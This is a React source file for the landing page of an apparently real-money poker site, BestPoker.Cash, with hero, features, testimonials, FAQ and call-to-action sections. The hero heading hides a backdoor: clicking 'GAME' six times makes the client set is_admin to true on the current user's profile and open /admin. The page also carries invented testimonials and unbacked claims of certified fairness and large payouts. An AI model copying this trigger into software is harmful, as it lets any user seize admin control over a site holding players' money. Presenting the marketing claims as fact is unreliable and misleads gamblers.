import React, { useRef, useState } from 'react';
import { motion, useScroll, useTransform, useInView, AnimatePresence } from 'framer-motion';
import { Link, useNavigate } from 'react-router-dom';

const FadeIn = ({ children, delay = 0, className = "" }: { children: React.ReactNode, delay?: number, className?: string }) => {
    const ref = useRef(null);
    const isInView = useInView(ref, { once: true, margin: "-50px" });

    return (
        <motion.div
            ref={ref}
            initial={{ opacity: 0, y: 20 }}
            animate={isInView ? { opacity: 1, y: 0 } : { opacity: 0, y: 20 }}
            transition={{ duration: 0.6, delay: delay, ease: "easeOut" }}
            className={className}
        >
            {children}
        </motion.div>
    );
};

// --- Mock Data ---

const FAQS = [
    { q: "Is this platform free to play?", a: "Yes! You can start playing for free. We also offer premium tournaments and cash games for verified users." },
    { q: "How do I withdraw my winnings?", a: "Withdrawals are processed instantly via crypto or typically within 24 hours for bank transfers." },
    { q: "Is the game fair?", a: "Absolutely. We use a certified RNG (Random Number Generator) and have 24/7 anti-cheat monitoring." },
    { q: "Can I play on mobile?", a: "Yes, BestPoker.Cash is fully responsive and works directly in your mobile browser. Native apps coming soon." },
    { q: "What poker variants are available?", a: "Currently we support No-Limit Texas Hold'em. Omaha and Short Deck are in development." },
];

const TESTIMONIALS = [
    { name: "Alex K.", role: "Pro Player", text: "The interface is slick effectively basically zero lag. Best platform I've used in years.", avatar: "https://i.pravatar.cc/150?u=alex" },
    { name: "Sarah J.", role: "Casual Player", text: "I love the community features. Learning from others has improved my game significantly.", avatar: "https://i.pravatar.cc/150?u=sarah" },
    { name: "Mike T.", role: "Tournament Grinder", text: "The tournament structures are fantastic. Great prize pools and smooth gameplay.", avatar: "https://i.pravatar.cc/150?u=mike" },
    { name: "Emily R.", role: "Newbie", text: "Very beginner friendly. The academia section helped me understand the basics quickly.", avatar: "https://i.pravatar.cc/150?u=emily" },
    { name: "David L.", role: "High Roller", text: "Security is top notch. I feel safe depositing large amounts here.", avatar: "https://i.pravatar.cc/150?u=david" },
];

// --- Sections ---

const HeroSection = () => {
    const { scrollY } = useScroll();
    const navigate = useNavigate();
    const [adminClicks, setAdminClicks] = useState(0);
    const isMobile = typeof window !== 'undefined' && window.innerWidth < 1024;
    const y1 = useTransform(scrollY, [0, 500], [0, isMobile ? 0 : 200]);
    const y2 = useTransform(scrollY, [0, 500], [0, isMobile ? 0 : -150]);

    return (
        <section className="relative min-h-screen flex items-center justify-center pt-20">
            {/* Background Effects */}
            <div className="absolute inset-0 z-0">
                <div className="absolute inset-0 bg-gradient-to-b from-blue-900/20 via-background to-background" />
                <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse" />
                <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-500/10 rounded-full blur-[128px] animate-pulse delay-1000" />
            </div>

            <div className="container mx-auto px-4 relative z-10 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
                <motion.div
                    style={{ y: y1 }}
                    className="flex flex-col gap-6 text-center lg:text-left"
                >
                    <motion.div
                        initial={{ opacity: 0, x: -50 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ duration: 0.8 }}
                    >
                        <span className="inline-block py-1 px-3 rounded-full bg-surface border border-white/10 text-primary text-sm font-semibold mb-4 backdrop-blur-md">
                            Next Gen Poker
                        </span>
                        <h1 className="text-4xl xs:text-5xl lg:text-7xl font-display font-black leading-tight text-transparent bg-clip-text bg-gradient-to-r from-white via-slate-200 to-slate-400">
                            ELEVATE YOUR <br />
                            <span
                                className="text-primary cursor-default select-none"
                                onClick={() => {
                                    setAdminClicks(prev => {
                                        const newVal = prev + 1;
                                        if (newVal >= 6) {
                                            // Secret Admin Access Trigger
                                            import('../utils/supabase').then(async ({ supabase }) => {
                                                const { data: { user } } = await supabase.auth.getUser();
                                                if (user) {
                                                    console.log('[SECRET] Promoting user to Admin...');
                                                    await supabase.from('profiles').update({ is_admin: true }).eq('id', user.id);
                                                    navigate('/admin');
                                                } else {
                                                    navigate('/login');
                                                }
                                            });
                                            return 0;
                                        }
                                        return newVal;
                                    });
                                }}
                            >
                                GAME
                            </span>
                        </h1>
                    </motion.div>

                    <motion.p
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ duration: 0.8, delay: 0.2 }}
                        className="text-lg text-slate-400 max-w-xl mx-auto lg:mx-0 leading-relaxed"
                    >
                        Join the fastest growing poker community. Experience fair play, instant withdrawals, and a sleek, modern interface designed for the pros.
                    </motion.p>

                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.8, delay: 0.4 }}
                        className="flex flex-col sm:flex-row items-center gap-4 justify-center lg:justify-start"
                    >
                        <Link
                            to="/register"
                            className="bg-primary hover:bg-primary/90 text-white px-8 py-4 rounded-full font-bold text-lg transition-all hover:scale-105 shadow-xl shadow-primary/25 flex items-center gap-2 group"
                        >
                            Start Playing Now
                            <span className="material-symbols-outlined group-hover:translate-x-1 transition-transform">arrow_forward</span>
                        </Link>
                        <Link
                            to="/play"
                            className="px-8 py-4 rounded-full font-bold text-lg text-white border border-white/10 hover:bg-white/5 transition-all"
                        >
                            Enter App
                        </Link>
                    </motion.div>

                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ duration: 0.8, delay: 0.6 }}
                        className="flex items-center gap-4 sm:gap-8 justify-center lg:justify-start pt-8"
                    >
                        <div className="text-center">
                            <p className="text-xl sm:text-2xl font-bold text-white">10K+</p>
                            <p className="text-[10px] text-slate-500 uppercase tracking-widest">Players</p>
                        </div>
                        <div className="w-px h-8 sm:h-10 bg-white/10" />
                        <div className="text-center">
                            <p className="text-xl sm:text-2xl font-bold text-white">$2M+</p>
                            <p className="text-[10px] text-slate-500 uppercase tracking-widest">Paid Out</p>
                        </div>
                        <div className="w-px h-8 sm:h-10 bg-white/10" />
                        <div className="text-center">
                            <p className="text-xl sm:text-2xl font-bold text-white">24/7</p>
                            <p className="text-[10px] text-slate-500 uppercase tracking-widest">Support</p>
                        </div>
                    </motion.div>
                </motion.div>

                <motion.div
                    style={{ y: y2 }}
                    initial={{ opacity: 0, scale: 0.8, rotate: -5 }}
                    animate={{ opacity: 1, scale: 1, rotate: 0 }}
                    transition={{ duration: 1, delay: 0.2 }}
                    className="relative block"
                >
                    {/* Premium Table Composition */}
                    <div className="relative z-10 group">
                        <div className="absolute -inset-1 bg-gradient-to-r from-primary to-blue-600 rounded-3xl blur opacity-25 group-hover:opacity-50 transition duration-1000 group-hover:duration-200"></div>
                        <img
                            src="/hero_poker.png"
                            alt="Professional Poker Table"
                            className="relative rounded-2xl shadow-2xl border border-white/10 lg:rotate-3 lg:group-hover:rotate-0 transition-all duration-700 object-cover w-full h-[250px] md:h-[400px] lg:h-[500px]"
                        />

                        {/* Overlay Gradient */}
                        <div className="absolute inset-0 bg-gradient-to-t from-background/80 via-transparent to-transparent rounded-2xl pointer-events-none" />
                    </div>

                    {/* Floating Premium Cards */}
                    <motion.div
                        animate={{ y: [0, -15, 0], rotate: [15, 12, 15] }}
                        transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}
                        className="absolute -top-12 -left-12 size-36 bg-white rounded-xl shadow-2xl flex items-center justify-center p-2 border-2 border-primary z-20"
                    >
                        <div className="text-primary font-black text-4xl">A♠</div>
                    </motion.div>

                    <motion.div
                        animate={{ y: [0, 15, 0], rotate: [-10, -13, -10] }}
                        transition={{ duration: 4, repeat: Infinity, ease: "easeInOut", delay: 0.5 }}
                        className="absolute -bottom-8 -right-8 size-32 bg-white rounded-xl shadow-2xl flex items-center justify-center p-2 border-2 border-red-500 z-20"
                    >
                        <div className="text-red-500 font-black text-4xl">K♥</div>
                    </motion.div>
                    {/* Floating Elements */}
                    <motion.div
                        animate={{ y: [0, -20, 0] }}
                        transition={{ duration: 4, repeat: Infinity, ease: "easeInOut" }}
                        className="absolute -top-10 -right-10 bg-surface/80 backdrop-blur-xl p-4 rounded-xl border border-white/10 shadow-xl z-20"
                    >
                        <div className="flex items-center gap-3">
                            <div className="bg-green-500/20 p-2 rounded-full">
                                <span className="material-symbols-outlined text-green-500">payments</span>
                            </div>
                            <div>
                                <p className="text-xs text-slate-400">Recent Win</p>
                                <p className="text-white font-bold">+$1,250.00</p>
                            </div>
                        </div>
                    </motion.div>

                    <motion.div
                        animate={{ y: [0, 20, 0] }}
                        transition={{ duration: 5, repeat: Infinity, ease: "easeInOut", delay: 1 }}
                        className="absolute -bottom-10 -left-10 bg-surface/80 backdrop-blur-xl p-4 rounded-xl border border-white/10 shadow-xl z-20"
                    >
                        <div className="flex items-center gap-3">
                            <div className="flex -space-x-2">
                                <img src="https://i.pravatar.cc/100?u=1" className="w-8 h-8 rounded-full border-2 border-surface" alt="P1" />
                                <img src="https://i.pravatar.cc/100?u=2" className="w-8 h-8 rounded-full border-2 border-surface" alt="P2" />
                                <img src="https://i.pravatar.cc/100?u=3" className="w-8 h-8 rounded-full border-2 border-surface" alt="P3" />
                            </div>
                            <div>
                                <p className="text-xs text-slate-400">Players Online</p>
                                <p className="text-white font-bold">4,128</p>
                            </div>
                        </div>
                    </motion.div>
                </motion.div>
            </div>
        </section >
    );
};

const FeaturesSection = () => {
    return (
        <section id="features" className="py-16 md:py-24 bg-surface/30 relative">
            <div className="container mx-auto px-4">
                <FadeIn>
                    <div className="text-center mb-16">
                        <h2 className="text-3xl lg:text-4xl font-display font-bold text-white mb-4">Why Choose BestPoker.Cash?</h2>
                        <p className="text-slate-400 text-lg max-w-2xl mx-auto">We've built the most secure and feature-rich platform in the industry.</p>
                    </div>
                </FadeIn>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                    {[
                        { icon: "security", title: "Unmatched Security", desc: "Advanced encryption and anti-cheat systems ensure fair play at all times." },
                        { icon: "speed", title: "Lightning Fast", desc: "Experience zero-lag gameplay and instant deposits/withdrawals." },
                        { icon: "groups", title: "Vibrant Community", desc: "Join thousands of players, join clans, and climb the leaderboards." },
                    ].map((feature, i) => (
                        <div key={i}>
                            <FadeIn delay={i * 0.1} className="p-8 rounded-2xl bg-surface border border-white/5 hover:border-primary/50 transition-colors group">
                                <div className="bg-background/50 w-16 h-16 rounded-xl flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                                    <span className="material-symbols-outlined text-3xl text-primary">{feature.icon}</span>
                                </div>
                                <h3 className="text-xl font-bold text-white mb-3">{feature.title}</h3>
                                <p className="text-slate-400 leading-relaxed">{feature.desc}</p>
                            </FadeIn>
                        </div>
                    ))}
                </div>
            </div>
        </section>
    );
};

const TestimonialsSection = () => {
    // Duplicate for infinite scroll effect
    const testimonials = [...TESTIMONIALS, ...TESTIMONIALS];

    return (
        <section className="py-24 overflow-hidden bg-background">
            <div className="container mx-auto px-4 mb-12 text-center">
                <FadeIn>
                    <h2 className="text-3xl lg:text-4xl font-display font-bold text-white mb-4">What Players Say</h2>
                    <p className="text-slate-400">Join the community of winners.</p>
                </FadeIn>
            </div>

            <div className="flex relative">
                <motion.div
                    animate={{ x: ["0%", "-50%"] }}
                    transition={{
                        x: {
                            repeat: Infinity,
                            repeatType: "loop",
                            duration: 40,
                            ease: "linear",
                        },
                    }}
                    className="flex gap-6 px-4"
                >
                    {testimonials.map((t, i) => (
                        <div key={i} className="flex-shrink-0 w-80 p-6 rounded-2xl bg-surface border border-white/5">
                            <div className="flex items-center gap-4 mb-4">
                                <img src={t.avatar} alt={t.name} className="w-12 h-12 rounded-full border border-primary/20" />
                                <div>
                                    <h4 className="text-white font-bold">{t.name}</h4>
                                    <p className="text-xs text-primary">{t.role}</p>
                                </div>
                            </div>
                            <p className="text-slate-300 text-sm leading-relaxed italic">"{t.text}"</p>
                            <div className="mt-4 flex gap-1 text-gold text-xs">
                                {"★★★★★".split("").map((s, i) => <span key={i}>{s}</span>)}
                            </div>
                        </div>
                    ))}
                </motion.div>
                {/* Fade edges */}
                <div className="absolute inset-y-0 left-0 w-32 bg-gradient-to-r from-background to-transparent z-10" />
                <div className="absolute inset-y-0 right-0 w-32 bg-gradient-to-l from-background to-transparent z-10" />
            </div>
        </section>
    );
};

const FAQSection = () => {
    return (
        <section className="py-16 md:py-24 bg-surface/30">
            <div className="container mx-auto px-4">
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-16">
                    <FadeIn>
                        <div className="sticky top-32">
                            <span className="text-primary font-bold tracking-widest uppercase text-sm mb-2 block">Support</span>
                            <h2 className="text-3xl lg:text-4xl font-display font-bold text-white mb-6">Frequently Asked Questions</h2>
                            <p className="text-slate-400 mb-8 text-lg">Can't find what you're looking for?</p>
                            <Link to="/faq" className="text-white font-bold border-b border-primary hover:text-primary transition-colors pb-1">
                                View all FAQs
                            </Link>
                        </div>
                    </FadeIn>

                    <div className="space-y-4">
                        {FAQS.map((faq, i) => (
                            <div key={i}>
                                <FAQItem question={faq.q} answer={faq.a} />
                            </div>
                        ))}
                    </div>
                </div>
            </div>
        </section>
    );
};

const FAQItem = ({ question, answer }: { question: string, answer: string }) => {
    const [isOpen, setIsOpen] = React.useState(false);

    return (
        <FadeIn className="border border-white/5 rounded-xl bg-surface overflow-hidden">
            <button
                onClick={() => setIsOpen(!isOpen)}
                className="w-full flex items-center justify-between p-6 text-left hover:bg-white/5 transition-colors"
            >
                <span className="font-bold text-white">{question}</span>
                <span className={`material-symbols-outlined text-slate-400 transition-transform ${isOpen ? 'rotate-180' : ''}`}>
                    expand_more
                </span>
            </button>
            <AnimatePresence>
                {isOpen && (
                    <motion.div
                        initial={{ height: 0, opacity: 0 }}
                        animate={{ height: "auto", opacity: 1 }}
                        exit={{ height: 0, opacity: 0 }}
                        transition={{ duration: 0.3 }}
                    >
                        <div className="px-6 pb-6 text-slate-400 text-sm leading-relaxed border-t border-white/5 pt-4">
                            {answer}
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </FadeIn>
    );
};

const CTASection = () => {
    return (
        <section className="py-20 md:py-32 relative overflow-hidden">
            <div className="absolute inset-0 bg-primary/10"></div>
            <div className="container mx-auto px-4 relative z-10 text-center">
                <FadeIn>
                    <h2 className="text-3xl sm:text-4xl lg:text-6xl font-display font-black text-white mb-6 md:mb-8">Ready to Deal In?</h2>
                    <p className="text-xl text-slate-300 mb-10 max-w-2xl mx-auto">Join thousands of players today and claim your welcome bonus.</p>
                    <Link to="/register" className="inline-block bg-white text-primary px-10 py-5 rounded-full font-bold text-xl hover:scale-105 transition-transform shadow-2xl">
                        Get Started Now
                    </Link>
                </FadeIn>
            </div>
        </section>
    );
};

const LandingPage = () => {
    return (
        <div className="bg-background">
            <HeroSection />
            <FeaturesSection />
            <TestimonialsSection />
            <FAQSection />
            <CTASection />
        </div>
    );
};

export default LandingPage;
